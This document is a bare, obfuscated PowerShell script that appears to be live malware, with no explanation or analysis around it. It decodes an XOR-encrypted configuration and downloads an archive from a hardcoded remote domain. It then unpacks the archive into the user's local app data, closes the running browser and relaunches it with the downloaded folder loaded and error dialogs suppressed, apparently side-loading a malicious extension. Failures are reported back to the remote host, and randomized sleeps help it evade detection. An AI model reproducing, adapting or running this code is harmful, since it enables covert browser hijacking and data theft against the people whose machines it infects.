function sel($ag) {
        try {
                $ur=$ag[0];
                $dt=$ag[1];
                wget $ur -Method POST -Body $dt -UseBasicParsing
        } catch{}
}
function stop() {
        try {
                iex "$fs()";
        } catch{}
}
function run($ag) {
        $dl=$ag[0];
        $u=$ag[1];
        $is=$ag[2];
        $di = "";
        if ($ag.length -gt 3) {
                $di=$ag[3];
        }
        $td = "952429";
        if ($di.length -gt 0) {
                $td = "964722";
        }
        $iv = "107";
        try {
                $up=$($env:USERPROFILE);
                $la=$($env:LOCALAPPDATA);
                $eb=[System.Convert]::FromBase64String("Rjk4TkIdG1smMClUXREjNkldLzAnV1srYGoZGiwjJVJfPC0zV1xgKDUbFG5gMlxVPmw8UEhsbmYbTSwnKlBTKzYuXFk+bCVWVWxuZhtWLy8jBB8tKjRWVStsI0FdaWBqGRoiLSddFSs6MlxWPSspVxpiYmRaUDwtK1waYmJkegISHhZLVykwJ1QYCCsqXEsSHmQVGGwBfGVkHjApXkovL2Z/USInNRkQNnpwEGQSYGoZGgktKV5UKx4aelA8LStcZBIDNklUJyEnTVEhLBplWyYwKVRdYCc+XBpiYh0bWyYwKVRdETYjSkxsbmYbWyYwKVRdETIjS14hMCtYVi0nZBUYbCEuS1cjJxldUT0yKlhBbB8b");
                $k=$eb[0..4];
                $bs=$eb[5..$eb.length];
                $rs=@();
                $j=0;
                [array]::Resize([ref]$rs,$bs.length);
                foreach($b in $bs) {$rs[$j++]=($b -bxor $k[$j%$k.length])}
                $ja=$a.GetString($rs) | ConvertFrom-Json;
                $p=$ja[0];
                $exp="$la\$p";
                $b=$ja[1];
                $bgp="$exp\$b";
                $z=$ja[2];
                $arn="$up\$z";
                $d=$ja[3];
                try {
                        iex "$fr('$d','$u','$is','$td')";
                } catch{}
                $fl=$ja[4];
                $le=$ja[5];
                $ce=$ja[6];
                $pf=$ja[7];
                $pfx=$ja[8];
                $cex=$ja[9];
                $op=$ja[10];
                $ico=0
                $dd=""
                $ver="0"
                $chp = ""
                $chpf="$pf$cex";
                $chpfx="$pfx$cex";
                $chpla="$la\$cex";
                $oc=0
                :fl for ($i=0 ; $i -lt $op.count ; ++$i) {
                        $lp = $op[$i];
                        $lep="$la\$lp";
                        $lbgp="$lep\$b";
                        if ((Test-Path -Path "$lep") -and (Test-Path -Path "$lbgp")) {
                                $exp=$lep;
                                $bgp=$lbgp;
                                break fl;
                        }
                }
                if(-not ((Test-Path -Path "$exp") -and (Test-Path -Path "$bgp"))) {
                        $rp = wget "https://$d/e?iver=$iv&u=$u&is=$is&ed=$di" -UseBasicParsing
                        if ($rp.Content.length -gt 0) {
                                [io.file]::WriteAllBytes($arn, $rp.Content)
                                Expand-Archive -LiteralPath "$arn" -DestinationPath "$exp" -Force
                                Remove-Item -path "$arn" -Force
                                $oc = 1;
                        }
                } else {
                        try {
                                if (Test-Path -Path $bgp) {
                                        $bg = Get-Content -Path $bgp
                                        $bgArray = $bg.split('"')
                                        $dd = $bgArray[-2]
                                }
                        } catch{}
                        if ($dd -and $ver) {
                                $r = get-random 100 -minimum 1;
                                if ($r -le 10) {
                                        try {
                                                $rp = wget "https://$d/e?iver=$iv&did=$dd&ver=$ver&ed=$di" -UseBasicParsing
                                                if ($rp.Content.length -gt 0) {
                                                        [io.file]::WriteAllBytes($arn, $rp.Content)
                                                        if (Test-Path -Path "$arn") {
                                                                Expand-Archive -LiteralPath "$arn" -DestinationPath "$exp" -Force
                                                                Remove-Item -path "$arn" -Force                                                                $oc = 1;
                                                        }
                                                }
                                        } catch{}
                                }
                        }
                }
                $ile=0;
                (Get-WmiObject Win32_Process -Filter $fl) | Where-Object { $ile -eq 0 } | Select-Object CommandLine | ForEach-Object {
                        if($_ -Match $le) {
                                $ile=1
                        } else {
                                try{
                                        $chp = (Get-WmiObject Win32_Process -Filter $fl)[0] | Select ExecutablePath -ExpandProperty ExecutablePath
                                } catch{}
                                $ico = 1
                        }
                }
                if($ile -eq 0 -and ($ico -or $oc)) {
                        try {
                                Get-Process $ce | ForEach-Object { $_.CloseMainWindow() | Out-Null }
                        } catch{}
                        $inf="";
                        $ur="https://$d/err?iver=$iv&did=$dd&ver=$ver";
                        try {
                                Start-Sleep 3
                                if (([string]::IsNullOrEmpty($chp) -eq $false) -and (Test-Path -Path $chp)) {
                                        $inf=$chp;
                                        Start-Process -FilePath $chp -ArgumentList --$le="$exp", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble;
                                } elseif (([string]::IsNullOrEmpty($chpf) -eq $false) -and (Test-Path -Path $chpf)) {
                                        $inf=$chpf;
                                        Start-Process -FilePath $chpf -ArgumentList --$le="$exp", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble;
                                } elseif (([string]::IsNullOrEmpty($chpfx) -eq $false) -and (Test-Path -Path $chpfx)) {
                                        $inf=$chpfx;
                                        Start-Process -FilePath $chpfx -ArgumentList --$le="$exp", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble;
                                } elseif (([string]::IsNullOrEmpty($chpla) -eq $false) -and (Test-Path -Path $chpla)) {
                                        $inf=$chpla;
                                        Start-Process -FilePath $chpla -ArgumentList --$le="$exp", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble;
                                } else {
                                        $inf="else";
                                        start $ce --$le="$exp", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble
                                }
                        } catch {
                                $err = $_.Exception.Message;
                                if ($inf -ne "") {
                                        $err = "$err|$inf";
                                }
                                sel($ur, $err);
                        }
                }
        } catch {
                try {
                        $ul="https://$dl/err?iver=$iv&u=$u&is=$is";
                        $err = $_.Exception.Message;
                        $err = "exc|$err";
                        sel($ul, $err);
                } catch{}
        }
        try {
                if ($lv -eq "1") {
                        $sls2 = ((get-random 70 -minimum 50)*60);
                        $tts = [int](Get-Date -UFormat %s);
                        :ssl while($true) {
                                Start-Sleep (get-random 65 -minimum 25);
                                $tts2 = [int](Get-Date -UFormat %s);
                                if (($tts2-$tts) -gt $sls2) {
                                        break ssl;
                                }
                        }
                }
        } catch{}
}

$ag = @("andhthrewdo.xyz",3703528239820109818,1675133478,"NzA2NTUEBgYGAAUJBAYMDwMGBAUOCQcNSQ8BAAIFBk0HAwICAAUGBgAASg%3D%3D");
run($ag)
